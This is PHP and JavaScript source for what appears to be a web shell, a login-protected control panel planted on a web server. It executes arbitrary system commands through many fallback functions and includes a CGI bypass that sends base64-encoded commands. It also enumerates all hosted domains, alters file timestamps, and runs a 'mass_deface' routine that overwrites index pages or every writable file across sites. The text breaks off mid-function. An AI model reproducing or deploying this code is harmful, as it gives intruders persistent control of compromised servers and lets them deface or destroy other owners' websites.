// ===================== CSRF PROTECTION ======================
function generateCSRFToken() {
    global $config;
    if (empty($_SESSION[$config['csrf_token_name']])) {
        $_SESSION[$config['csrf_token_name']] = bin2hex(random_bytes(32));
    }
    return $_SESSION[$config['csrf_token_name']];
}

function verifyCSRFToken($token) {
    global $config;
    if (empty($token) || empty($_SESSION[$config['csrf_token_name']])) {
        return false;
    }
    return hash_equals($_SESSION[$config['csrf_token_name']], $token);
}

// ===================== RATE LIMITING ======================
function checkLoginAttempts() {
    global $config;
    $ip = $_SERVER['REMOTE_ADDR'];
    $key = 'login_attempts_' . $ip;
    $lock_key = 'login_lockout_' . $ip;
    
    if (isset($_SESSION[$lock_key]) && $_SESSION[$lock_key] > time()) {
        return ['locked' => true, 'remaining' => $_SESSION[$lock_key] - time()];
    }
    
    if (!isset($_SESSION[$key])) {
        $_SESSION[$key] = 0;
    }
    
    return ['locked' => false, 'attempts' => $_SESSION[$key], 'max' => $config['max_login_attempts']];
}

function incrementLoginAttempts() {
    global $config;
    $ip = $_SERVER['REMOTE_ADDR'];
    $key = 'login_attempts_' . $ip;
    $lock_key = 'login_lockout_' . $ip;
    
    $_SESSION[$key] = ($_SESSION[$key] ?? 0) + 1;
    
    if ($_SESSION[$key] >= $config['max_login_attempts']) {
        $_SESSION[$lock_key] = time() + $config['login_lockout_time'];
    }
}

function resetLoginAttempts() {
    $ip = $_SERVER['REMOTE_ADDR'];
    unset($_SESSION['login_attempts_' . $ip]);
    unset($_SESSION['login_lockout_' . $ip]);
}

// ===================== LOGIN SYSTEM ======================
function requireLogin() {
    global $config;
    
    if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity'] > $config['session_timeout'])) {
        session_destroy();
        session_start();
        $_SESSION['logout_reason'] = 'Session expired';
        header('Location: ' . $_SERVER['PHP_SELF'] . '?logout=1');
        exit;
    }
    $_SESSION['last_activity'] = time();
    
    if (!isset($_SESSION['session_regenerated']) || $_SESSION['session_regenerated'] < time() - 300) {
        session_regenerate_id(true);
        $_SESSION['session_regenerated'] = time();
    }
    
    if (isset($_POST['login_user']) && isset($_POST['login_pass'])) {
        $attempts = checkLoginAttempts();
        
        if ($attempts['locked']) {
            $remaining = ceil($attempts['remaining'] / 60);
            showLoginPage("⚠️ Terlalu banyak percobaan. Coba lagi dalam {$remaining} menit.");
            exit;
        }
        
        if ($_POST['login_user'] === $config['username'] && 
            password_verify($_POST['login_pass'], $config['password_hash'])) {
            
            resetLoginAttempts();
            $_SESSION['logged_in'] = true;
            $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
            $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
            logActivityMulti("✅ Login successful from " . $_SERVER['REMOTE_ADDR']);
            header('Location: ' . $_SERVER['PHP_SELF'] . '?login_success=1');
            exit;
        } else {
            incrementLoginAttempts();
            logActivityMulti("❌ Login failed from " . $_SERVER['REMOTE_ADDR']);
            showLoginPage("❌ Username atau password salah!");
            exit;
        }
    }
    
    if (isset($_GET['logout'])) {
        logActivityMulti("User logged out");
        session_destroy();
        session_start();
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }
    
    if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
        showLoginPage();
        exit;
    }
    
    if ($_SESSION['ip'] !== $_SERVER['REMOTE_ADDR'] || 
        $_SESSION['user_agent'] !== $_SERVER['HTTP_USER_AGENT']) {
        session_destroy();
        session_start();
        showLoginPage("⚠️ Session tidak valid. Silakan login ulang.");
        exit;
    }
}

// ---- Base64 Encode/Decode ----
function kj_base64_encode($s) {
    if(function_exists('base64_encode')) return base64_encode($s);
    $b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
    $enc = '';
    for($i=0; $i<strlen($s); $i+=3) {
        $o1 = ord($s[$i]);
        $o2 = isset($s[$i+1]) ? ord($s[$i+1]) : 0;
        $o3 = isset($s[$i+2]) ? ord($s[$i+2]) : 0;
        $bits = ($o1 << 16) | ($o2 << 8) | $o3;
        $h1 = ($bits >> 18) & 0x3f;
        $h2 = ($bits >> 12) & 0x3f;
        $h3 = ($bits >> 6) & 0x3f;
        $h4 = $bits & 0x3f;
        $enc .= $b64[$h1] . $b64[$h2] . $b64[$h3] . $b64[$h4];
    }
    return $enc;
}

function kj_base64_decode($s) {
    if(function_exists('base64_decode')) return base64_decode($s);
    $b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
    $dec = '';
    $s = preg_replace('[^A-Za-z0-9\+\/\=]', "", $s);
    for($i=0; $i<strlen($s); $i+=4) {
        $h1 = strpos($b64, $s[$i]);
        $h2 = strpos($b64, $s[$i+1]);
        $h3 = strpos($b64, $s[$i+2]);
        $h4 = strpos($b64, $s[$i+3]);
        $bits = ($h1 << 18) | ($h2 << 12) | ($h3 << 6) | $h4;
        $o1 = ($bits >> 16) & 0xff;
        $o2 = ($bits >> 8) & 0xff;
        $o3 = $bits & 0xff;
        $dec .= chr($o1);
        if($h3 != 64) $dec .= chr($o2);
        if($h4 != 64) $dec .= chr($o3);
    }
    return $dec;
}

// ---- Command Execution ----
function kjEx($in, $re=false, $cgi=true, $all=false) {
    $data = _kj_php_cmd($in, $re);
    if(empty($data) && $cgi || $all) {
        if($GLOBALS['sys'] == 'unix') {
            if(strlen(_kj_php_cmd("whoami")) == 0 || $all) {
                $cmd = _kj_cgicmd($in);
                if(!empty($cmd)) return $cmd;
            }
        }
    }
    return $data;
}

function _kj_php_cmd($in, $re=false) {
    $out = '';
    try {
        if($re) $in = $in . " 2>&1";
        
        if(function_exists('exec')) {
            @exec($in, $out);
            $out = @join("\n", $out);
        } elseif(function_exists('passthru')) {
            ob_start();
            @passthru($in);
            $out = ob_get_clean();
        } elseif(function_exists('system')) {
            ob_start();
            @system($in);
            $out = ob_get_clean();
        } elseif(function_exists('shell_exec')) {
            $out = shell_exec($in);
        } elseif(function_exists("popen") && function_exists("pclose")) {
            if(is_resource($f = @popen($in, "r"))) {
                $out = "";
                while(!@feof($f)) $out .= fread($f, 1024);
                pclose($f);
            }
        } elseif(function_exists('proc_open')) {
            $pipes = array();
            $process = @proc_open($in.' 2>&1', array(
                array("pipe","w"), array("pipe","w"), array("pipe","w")
            ), $pipes, null);
            $out = @stream_get_contents($pipes[1]);
        } elseif(class_exists('COM')) {
            $ws = new COM('WScript.shell');
            $exec = $ws->exec('cmd.exe /c '.$in);
            $stdout = $exec->StdOut();
            $out = $stdout->ReadAll();
        }
    } catch(Exception $e) {
        return 'Error: ' . $e->getMessage();
    }
    return $out;
}

function _kj_cgicmd($cmd, $lang="perl", $set_cookie=false) {
    $is_curl = function_exists('curl_version');
    $is_socket = function_exists('fsockopen');
    
    if($is_curl || $is_socket) {
        $cgi_url = "cgibypass." . ($lang == "perl"? "pl" : "py");
        $cmd = "check=api&cmd=" . kj_base64_encode("cd ".$GLOBALS['cwd'].";".$cmd);
        
        if($is_curl) {
            $address = ($_SERVER['SERVER_PORT'] == 443 ? "https://" : "http://") .
                       $_SERVER["SERVER_NAME"] . 
                       dirname($_SERVER["REQUEST_URI"]) . "/" . $cgi_url;
            $data = _kj_curl_request($address, "post", $cmd);
        } elseif($is_socket) {
            $server = $_SERVER["SERVER_NAME"];
            $uri = dirname($_SERVER["REQUEST_URI"]) . "/" . $cgi_url;
            $data = _kj_socket_request($server, $uri, $cmd);
        }
        
        $out = "";
        if(strpos($data, "[api]") !== false) {
            if(@preg_match("/<pre>(.*?)<\/pre>/s", $data, $res)) $out = $res[1];
        }
        return trim($out);
    }
    return "";
}

function _kj_socket_request($server, $uri, $post) {
    $socket = @fsockopen($server, 80, $errno, $errstr, 15);
    if($socket) {
        $http  = "POST {$uri} HTTP/1.0\r\n";
        $http .= "Host: {$server}\r\n";
        $http .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
        $http .= "Content-Type: application/x-www-form-urlencoded\r\n";
        $http .= "Content-length: " . strlen($post) . "\r\n";
        $http .= "Connection: close\r\n\r\n";
        $http .= $post . "\r\n\r\n";
        fwrite($socket, $http);
        $contents = "";
        while (!@feof($socket)) $contents .= @fgets($socket, 4096);
        list($header, $body) = explode("\r\n\r\n", $contents, 2);
        @fclose($socket);
        return $body;
    }
    return "";
}

function _kj_curl_request($url, $method="get", $data="") {
    if(!function_exists('curl_init')) return false;
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    if($method == 'post') {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    }
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

// ===================== CHMOD MANAGER ======================

function chmodSingle($path, $permission) {
    $full_path = realpath($path);
    if (!$full_path || !file_exists($full_path)) {
        return array('status' => false, 'message' => "❌ File/Folder tidak ditemukan: " . $path);
    }
    
    $perm_octal = octdec($permission);
    
    try {
        if (@chmod($full_path, $perm_octal)) {
            logActivityMulti("CHMOD: " . $full_path . " → " . $permission, dirname($full_path));
            return array(
                'status' => true, 
                'message' => "✅ Permission changed: " . basename($full_path) . " → " . $permission,
                'path' => $full_path,
                'permission' => $permission
            );
        }
    } catch(Exception $e) {
        // Fallback to command
    }
    
    $cmd = "chmod " . $permission . " '" . addslashes($full_path) . "' 2>&1";
    $result = kjEx($cmd);
    if (empty($result) || strpos($result, 'chmod:') === false) {
        logActivityMulti("CHMOD (cmd): " . $full_path . " → " . $permission, dirname($full_path));
        return array(
            'status' => true,
            'message' => "✅ Permission changed (via command): " . basename($full_path) . " → " . $permission,
            'path' => $full_path,
            'permission' => $permission
        );
    } else {
        return array('status' => false, 'message' => "❌ Gagal change permission: " . $result);
    }
}

function chmodMass($dir, $file_permission = '644', $dir_permission = '755', $recursive = true) {
    $full_path = realpath($dir);
    if (!$full_path || !is_dir($full_path)) {
        return array('status' => false, 'message' => "❌ Direktori tidak ditemukan: " . $dir);
    }
    
    $results = [];
    $total_files = 0;
    $total_dirs = 0;
    $success_files = 0;
    $success_dirs = 0;
    $errors = [];
    
    $result = chmodSingle($full_path, $dir_permission);
    if ($result['status']) {
        $success_dirs++;
    } else {
        $errors[] = $result['message'];
    }
    $total_dirs++;
    
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($full_path, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    $iterator->setMaxDepth(20);
    
    foreach ($iterator as $item) {
        $path = $item->getPathname();
        $is_dir = $item->isDir();
        
        if ($is_dir) {
            $total_dirs++;
            $result = chmodSingle($path, $dir_permission);
            if ($result['status']) {
                $success_dirs++;
            } else {
                $errors[] = $result['message'];
            }
        } else {
            $total_files++;
            $result = chmodSingle($path, $file_permission);
            if ($result['status']) {
                $success_files++;
            } else {
                $errors[] = $result['message'];
            }
        }
    }
    
    $summary = [
        'status' => (count($errors) == 0),
        'total_files' => $total_files,
        'success_files' => $success_files,
        'total_dirs' => $total_dirs,
        'success_dirs' => $success_dirs,
        'errors' => $errors,
        'message' => "✅ CHMOD Massal selesai!\n   📁 Direktori: " . $success_dirs . "/" . $total_dirs . " berhasil\n   📄 File: " . $success_files . "/" . $total_files . " berhasil\n" . (count($errors) > 0 ? "   ❌ Error: " . count($errors) : "")
    ];
    
    logActivityMulti("Mass CHMOD: " . $full_path . " (file:" . $file_permission . ", dir:" . $dir_permission . ")", $full_path);
    
    return $summary;
}

function chmodByPattern($dir, $pattern, $permission) {
    $full_path = realpath($dir);
    if (!$full_path || !is_dir($full_path)) {
        return array('status' => false, 'message' => "❌ Direktori tidak ditemukan: " . $dir);
    }
    
    $results = [];
    $total = 0;
    $success = 0;
    $errors = [];
    
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($full_path, RecursiveDirectoryIterator::SKIP_DOTS)
    );
    $iterator->setMaxDepth(15);
    
    foreach ($iterator as $item) {
        if (!$item->isFile()) continue;
        
        $filename = $item->getFilename();
        $path = $item->getPathname();
        
        $match = false;
        if (strpos($pattern, '*') !== false) {
            $pattern_regex = '/^' . str_replace('*', '.*', preg_quote($pattern, '/')) . '$/i';
            if (preg_match($pattern_regex, $filename)) $match = true;
        } elseif (strpos($pattern, ',') !== false) {
            $exts = array_map('trim', explode(',', $pattern));$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
            if (in_array($ext, $exts)) $match = true;
        } else {
            $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
            if ($ext == $pattern) $match = true;
        }
        
        if ($match) {
            $total++;
            $result = chmodSingle($path, $permission);
            if ($result['status']) {
                $success++;
                $results[] = $result['message'];
            } else {
                $errors[] = $result['message'];
            }
        }
    }
    
    return [
        'status' => (count($errors) == 0),
        'total' => $total,
        'success' => $success,
        'errors' => $errors,
        'message' => "✅ CHMOD by Pattern selesai!\n   📄 File ditemukan: " . $total . "\n   ✅ Berhasil: " . $success . "\n" . (count($errors) > 0 ? "   ❌ Error: " . count($errors) : "")];
}

function changeTimestamp($path, $timestamp, $type = 'both') {
    $full_path = realpath($path);
    if (!$full_path || !file_exists($full_path)) {
        return array('status' => false, 'message' => "❌ File/Folder tidak ditemukan: " . $path);
    }
    
    $results = [];
    
    try {
        if ($type == 'both' || $type == 'mtime') {
            if (@touch($full_path, $timestamp)) {
                $results[] = "✅ Modified time updated: " . date('Y-m-d H:i:s', $timestamp);
            } else {
                $results[] = "❌ Failed to update modified time";
            }
        }
        
        if ($type == 'both' || $type == 'atime') {
            if (@touch($full_path, filemtime($full_path), $timestamp)) {
                $results[] = "✅ Access time updated: " . date('Y-m-d H:i:s', $timestamp);
            } else {
                $results[] = "❌ Failed to update access time";
            }
        }
        
        if (empty($results) || strpos(implode(' ', $results), '✅') !== false) {
            logActivityMulti("TIMESTEP: " . $full_path . " → " . date('Y-m-d H:i:s', $timestamp), dirname($full_path));
            return array(
                'status' => true,
                'message' => "✅ Timestamp updated!\n" . implode("\n", $results),
                'path' => $full_path,
                'timestamp' => $timestamp
            );
        } else {
            return array('status' => false, 'message' => implode("\n", $results));
        }
    } catch(Exception $e) {
        return array('status' => false, 'message' => "❌ Error: " . $e->getMessage());
    }
}

// ===================== MULTI-DOMAIN LOG FUNCTIONS ======================

function findAllDomains() {
    $domains = [];
    
    $home_dirs = glob('/home/*/public_html', GLOB_ONLYDIR);
    foreach ($home_dirs as $dir) {
        $user = basename(dirname($dir));
        $domains[] = ['path' => $dir, 'user' => $user, 'domain' => $user . ' (Home)'];
    }
    
    $www_dirs = glob('/var/www/*', GLOB_ONLYDIR);
    foreach ($www_dirs as $dir) {
        if (is_dir($dir) && (file_exists($dir . '/index.php') || file_exists($dir . '/index.html'))) {
            $name = basename($dir);
            $domains[] = ['path' => $dir, 'user' => 'www-data', 'domain' => $name . ' (www)'];
        }
    }
    
    $vhosts = glob('/var/www/vhosts/*', GLOB_ONLYDIR);
    foreach ($vhosts as $dir) {
        if (is_dir($dir)) {
            $domain = basename($dir);
            $domains[] = ['path' => $dir, 'user' => 'vhost', 'domain' => $domain . ' (Plesk)'];
        }
    }
    
    $current = __DIR__;
    $domains[] = ['path' => $current, 'user' => 'current', 'domain' => 'Current (' . basename($current) . ')'];
    
    $doc_root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : __DIR__;
    $server_name = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'localhost';
    $domains[] = ['path' => $doc_root, 'user' => 'server', 'domain' => $server_name . ' (DocumentRoot)'];
    
    return $domains;
}

function readDomainLog($log_path, $lines = 100, $filter = '') {
    $log_file = rtrim($log_path, '/') . '/' . $GLOBALS['config']['log_file'];
    
    if (!file_exists($log_file)) return "❌ Log file not found: " . $log_file;
    if (!is_readable($log_file)) return "❌ Log file not readable: " . $log_file;
    
    $output = [];
    $output[] = "📋 ACTIVITY LOG: " . $log_file;
    $output[] = "================================================";
    $output[] = "";
    
    $content = kjEx("tail -" . intval($lines) . " '" . addslashes($log_file) . "' 2>&1");
    
    if (empty($content)) {
        $output[] = "⚠️ Log file is empty";
        return implode("\n", $output);
    }
    
    if (!empty($filter)) {
        $lines_arr = explode("\n", $content);
        $filtered = [];
        foreach ($lines_arr as $line) {
            if (stripos($line, $filter) !== false) $filtered[] = $line;
        }
        $content = implode("\n", $filtered);
        if (empty($content)) {
            $output[] = "⚠️ No entries found with filter: " . $filter;
            return implode("\n", $output);
        }
        $output[] = "🔍 Filter: " . $filter . " (" . count($filtered) . " entries)";
        $output[] = "";
    }
    
    $output[] = $content;
    return implode("\n", $output);
}

function aggregateLogs($lines = 50) {
    $domains = findAllDomains();
    $all_logs = [];
    
    foreach ($domains as $domain) {
        $log_file = rtrim($domain['path'], '/') . '/' . $GLOBALS['config']['log_file'];
        if (file_exists($log_file) && is_readable($log_file)) {
            $content = kjEx("tail -" . intval($lines) . " '" . addslashes($log_file) . "' 2>&1");
            if (!empty($content)) {
                foreach (explode("\n", $content) as $line) {
                    if (!empty(trim($line))) {
                        $all_logs[] = ['domain' => $domain['domain'], 'path' => $domain['path'], 'line' => $line];
                    }
                }
            }
        }
    }
    
    usort($all_logs, function($a, $b) {
        preg_match('/\[(.*?)\]/', $a['line'], $match_a);
        preg_match('/\[(.*?)\]/', $b['line'], $match_b);
        if (isset($match_a[1]) && isset($match_b[1])) {
            return strtotime($match_b[1]) - strtotime($match_a[1]);
        }
        return 0;
    });
    
    return $all_logs;
}

function monitorFileChanges($minutes = 10) {
    $domains = findAllDomains();
    $changes = [];
    $since= time() - ($minutes * 60);
    
    foreach ($domains as $domain) {
        $path = $domain['path'];
        if (!is_dir($path)) continue;
        
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        $iterator->setMaxDepth(10);
        
        foreach ($iterator as $file) {
            if ($file->isFile()) {
                $mtime = $file->getMTime();
                if ($mtime >= $since) {
                    $changes[] = [
                        'domain' => $domain['domain'],
                        'path' => $file->getPathname(),
                        'name' => $file->getFilename(),
                        'size' => $file->getSize(),
                        'modified' => date('Y-m-d H:i:s', $mtime),
                        'type' => 'modified'
                    ];
                }
            }
        }
    }
    
    return $changes;
}

// ===================== EXTRACT FUNCTIONS ======================

function extract_file($file_path, $extract_to = '') {
    if(empty($extract_to)) {
        $extract_to = dirname($file_path) . '/' . pathinfo($file_path, PATHINFO_FILENAME);
    }
    if(!is_dir($extract_to)) @mkdir($extract_to, 0777, true);
    
    $mime_type = _get_mime_type($file_path);
    $ext = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
    if(strpos(basename($file_path), '.tar.gz') !== false) $mime_type = 'application/x-tar+gz';
    
    $result = array('status' => false, 'message' => '');
    
    switch($mime_type) {
        case 'zip':
        case 'application/zip':
            $result = _extract_zip($file_path, $extract_to);
            break;
        case 'tar':
        case 'application/x-tar':
            $result = _extract_tar($file_path, $extract_to);
            break;
        case 'gz':
        case 'gzip':
        case 'application/x-gzip':
            if(strpos(basename($file_path), '.tar.gz') !== false) {
                $result = _extract_targz($file_path, $extract_to);
            } else {
                $result = _extract_gz($file_path, $extract_to);
            }
            break;
        case 'application/x-tar+gz':
        case 'tgz':
            $result = _extract_targz($file_path, $extract_to);
            break;
        case 'rar':
        case 'application/x-rar':
            $result = _extract_rar($file_path, $extract_to);
            break;
        default:
            if($ext == 'zip') $result = _extract_zip($file_path, $extract_to);
            elseif($ext == 'tar') $result = _extract_tar($file_path, $extract_to);
            elseif($ext == 'gz') $result = _extract_gz($file_path, $extract_to);
            elseif($ext == 'rar') $result = _extract_rar($file_path, $extract_to);
            else $result['message'] = "Unsupported file type: " . $mime_type;
    }
    return $result;
}

function _extract_zip($file, $target) {
    if(_kj_can_runCommand()) {
        $cmd = "unzip -o '" . addslashes($file) . "' -d '" . addslashes($target) . "' 2>&1";
        kjEx($cmd);
        if(is_dir($target) && count(scandir($target)) > 2) {
            return array('status' => true, 'message' => "✅ Success! Extracted to: " . $target);
        }
    }
    if(class_exists('ZipArchive')) {
        $zip = new ZipArchive();
        if($zip->open($file) === true) {
            $zip->extractTo($target);
            $zip->close();
            return array('status' => true, 'message' => "✅ Success! Extracted to: " . $target);
        }
    }
    return array('status' => false, 'message' => "❌ Failed to extract ZIP file");
}

function _extract_tar($file, $target) {
    if(_kj_can_runCommand()) {
        $cmd = "tar -xf '" . addslashes($file) . "' -C '" . addslashes($target) . "' 2>&1";
        kjEx($cmd);
        if(is_dir($target) && count(scandir($target)) > 2) {
            return array('status' => true, 'message' => "✅ Success! Extracted to: " . $target);
        }
    }
    if(class_exists('PharData')) {
        try {
            $phar = new PharData($file);
            $phar->extractTo($target);
            return array('status' => true, 'message' => "✅ Success! Extracted to: " . $target);
        } catch(Exception $e) {}
    }
    return array('status' => false, 'message' => "❌ Failed to extract TAR file");
}

function _extract_gz($file, $target) {
    if(_kj_can_runCommand()) {
        $output_file = $target . '/' . str_replace('.gz', '', basename($file));
        $cmd = "gunzip -c '" . addslashes($file) . "' > '" . addslashes($output_file) . "'";
        kjEx($cmd);
        if(file_exists($output_file)) {
            return array('status' => true, 'message' => "✅ Success! Extracted to: " . $output_file);
        }
    }
    if(function_exists('gzdecode')) {
        $content = file_get_contents($file);
        $decoded = gzdecode($content);
        if($decoded !== false) {
            $output_file = $target . '/' . str_replace('.gz', '', basename($file));
            file_put_contents($output_file, $decoded);
            return array('status' => true, 'message' => "✅ Success! Extracted to: " . $output_file);
        }
    }
    return array('status' => false, 'message' => "❌ Failed to extract GZ file");
}

function _extract_targz($file, $target) {
    if(_kj_can_runCommand()) {
        $cmd = "tar -xzf '" . addslashes($file) . "' -C '" . addslashes($target) . "' 2>&1";
        kjEx($cmd);
        if(is_dir($target) && count(scandir($target)) > 2) {
            return array('status' => true, 'message' => "✅ Success! Extracted to: " . $target);
        }
    }
    if(class_exists('PharData')) {
        try {
            if(strpos(basename($file), '.tar.gz') !== false) {
                $new_file = $target . '/' . basename($file);
                @copy($file, $new_file);
                $new_tar = str_replace('.tar.gz', '.tar', $new_file);
                $p = new PharData($new_file);
                $p->decompress();
                $phar = new PharData($new_tar);
                $phar->extractTo($target);
                @unlink($new_file);
                @unlink($new_tar);
            } else {
                $phar = new PharData($file);
                $phar->extractTo($target);
            }
            return array('status' => true, 'message' => "✅ Success! Extracted to: " . $target);
        } catch(Exception $e) {}
    }
    return array('status' => false, 'message' => "❌ Failed to extract TAR.GZ file");
}

function _extract_rar($file, $target) {
    if(_kj_can_runCommand() && kjWhich('unrar')) {
        $cmd = "unrar x -o+ '" . addslashes($file) . "' '" . addslashes($target) . "'";
        kjEx($cmd);
        if(is_dir($target) && count(scandir($target)) > 2) {
            return array('status' => true, 'message' => "✅ Success! Extracted to: " . $target);
        }
    }
    if(class_exists('RarArchive')) {
        $rar = RarArchive::open($file);
        if($rar) {
            $entries = $rar->getEntries();
            foreach($entries as $entry) $entry->extract($target);
            $rar->close();
            return array('status' => true, 'message' => "✅ Success! Extracted to: " . $target);
        }
    }
    return array('status' => false, 'message' => "❌ Failed to extract RAR file");
}

function _get_mime_type($file) {
    if(function_exists('finfo_open')) {
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mime = finfo_file($finfo, $file);
        finfo_close($finfo);
        return $mime;
    }
    if(function_exists('mime_content_type')) return mime_content_type($file);
    if(_kj_can_runCommand()) {
        $mime = kjEx("file -b --mime-type '" . addslashes($file) . "'");
        if(!empty($mime)) return trim($mime);
    }
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    $mime_types = [
        'zip' => 'application/zip', 'rar' => 'application/x-rar',
        'tar' => 'application/x-tar', 'gz' => 'application/x-gzip',
        'tgz' => 'application/x-tar+gz', '7z' => 'application/x-7z-compressed'
    ];
    return isset($mime_types[$ext]) ? $mime_types[$ext] : 'unknown';
}

function zip_file($source, $destination) {
    if(_kj_can_runCommand()) {
        if($GLOBALS['sys'] == 'win') {
            $cmd = "powershell Compress-Archive -Path '" . addslashes($source) . "' -DestinationPath '" . addslashes($destination) . "'";
        } else {
            $cmd = "zip -r '" . addslashes($destination) . "' '" . addslashes($source) . "'";
        }
        kjEx($cmd);
        if(file_exists($destination)) {
            return array('status' => true, 'message' => "✅ Success! Created: " . $destination);
        }
    }
    if(class_exists('ZipArchive')) {
        if(_zip_with_php($source, $destination)) {
            return array('status' => true, 'message' => "✅ Success! Created: " . $destination);
        }
    }
    return array('status' => false, 'message' => "❌ Failed to create ZIP file");
}

function _zip_with_php($source, $destination) {
    if(!extension_loaded('zip') || !file_exists($source)) return false;
    $zip = new ZipArchive();
    if(!$zip->open($destination, ZIPARCHIVE::CREATE)) return false;
    $source = str_replace('\\', '/', realpath($source));
    if(is_dir($source) === true) {
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($source),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach($files as $file) {
            $file = str_replace('\\', '/', $file);
            if(in_array(substr($file, strrpos($file, '/') + 1), array('.', '..'))) continue;
            $file = realpath($file);
            if(is_dir($file) === true) {
                $zip->addEmptyDir(str_replace($source.'/', '', $file.'/'));
            } else if(is_file($file) === true) {
                $zip->addFromString(str_replace($source.'/', '', $file), file_get_contents($file));
            }
        }
    } else if(is_file($source) === true) {
        $zip->addFromString(basename($source), file_get_contents($source));
    }
    return $zip->close();
}

function mass_deface($dir, $filename, $content, $method = 'all') {
    if(!is_dir($dir) || !is_readable($dir)) {
        return array('status' => false, 'message' => "❌ Directory not readable");
    }
    $result = array('status' => true, 'files' => 0, 'message' => '');
    _mass_deface_recursive($dir, $filename, $content, $method, $result);
    $result['message'] = "✅ Done! Total " . $result['files'] . " files defaced";
    return $result;
}

function _mass_deface_recursive($dir, $filename, $content, $method, &$result) {
    if(!is_dir($dir)) return;
    $items = scandir($dir);
    foreach($items as $item) {
        if($item == '.' || $item == '..') continue;
        $path = $dir . '/' . $item;
        if(is_dir($path)) {
            _mass_deface_recursive($path, $filename, $content, $method, $result);
        } elseif(is_file($path) && is_writable($path)) {
            $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
            if($method == 'all') {
                file_put_contents($path, $content);
                $result['files']++;
            } elseif($method == 'index') {
                $index_files = array('index.php', 'index.htm', 'index.html', 'default.asp', 'default.aspx', 'index.asp', 'index.aspx');
                if(in_array(basename($path), $index_files)) {
                    file_put_contents($path, $content);
                    $result['files']++;
                }
            } elseif($method == 'ext') {
                $extensions = array('php', 'html', 'htm', 'asp', 'aspx', 'js');
                if(in_array($ext, $extensions)) {
                    file_put_contents($path, $content);
                    $result['files']++;
                }
            } else {
                if(basename($path) == $filename) {
                    file_put_contents($path, $content);
                    $result['files']++;
                }
            }
        }
    }
}

// ===================== UTILITY FUNCTIONS ======================

function formatSize($bytes) {
    if ($bytes == 0) return '0 B';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = floor(log($bytes, 1024));
    return round($bytes / pow(1024, $i), 2) . ' ' . $units[$i];
}

function deleteItem($path) {
    $full_path = realpath($path);
    if ($full_path == __DIR__) return false;
    if (!file_exists($full_path)) return false;
    if (is_dir($full_path)) {
        $files = array_diff(scandir($full_path), ['.', '..']);
        foreach ($files as $file) deleteItem($full_path . '/' . $file);
        return rmdir($full_path);
    } else {
        return unlink($full_path);
    }
}

function getDirectoryContent($path) {
    $items = [];
    $full_path = realpath($path);
    if (!is_dir($full_path)) return false;
    $files = scandir($full_path);
    foreach ($files as $file) {
        if ($file == '.' || $file == '..') continue;
        $file_path = $full_path . '/' . $file;
        $is_dir = is_dir($file_path);
        $permissions = substr(sprintf('%o', fileperms($file_path)), -4);
        $is_root = ($permissions == '777' || $permissions == '666');
        
        $items[] = [
            'name' => $file,
            'path' => $file_path,
            'is_dir' => $is_dir,
            'is_root' => $is_root,
            'size' => is_file($file_path) ? filesize($file_path) : 0,
            'modified' => filemtime($file_path),
            'permissions' => $permissions
        ];
    }
    usort($items, function($a, $b) {
        if ($a['is_dir'] == $b['is_dir']) return strcasecmp($a['name'], $b['name']);
        return $a['is_dir'] ? -1 : 1;
    });
    return $items;
}

function showTab(id) {
    document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
    document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
    document.getElementById('tab-' + id).classList.add('active');
    if (event && event.target) {
        event.target.closest('.tab').classList.add('active');
    }
}

function openModal(id) {
    document.getElementById(id).style.display = 'flex';
}

function closeModal(id) {
    document.getElementById(id).style.display = 'none';
}

window.onclick = function(event) {
    if (event.target.classList.contains('modal')) {
        event.target.style.display = 'none';
    }
}

document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') {
        document.querySelectorAll('.modal').forEach(m => m.style.display = 'none');
    }
});

function runWgetAndClear(form) {
    var url = document.getElementById('wget_url').value;
    var filename = document.getElementById('wget_filename').value;
    if (!url) { alert('Please enter URL!'); return false; }
    
    var resultDiv = document.getElementById('download_result');
    resultDiv.style.display = 'block';
    resultDiv.innerHTML = '⏳ Downloading: ' + url + '\n\n';
    document.getElementById('wget_url').value = '';
    if (document.getElementById('wget_filename')) {
        document.getElementById('wget_filename').value = '';
    }
    
    var formData = new FormData();
    formData.append('csrf_token', '<?php echo $csrf_token; ?>');
    formData.append('wget_download', '1');
    formData.append('wget_url', url);
    formData.append('wget_filename', filename);
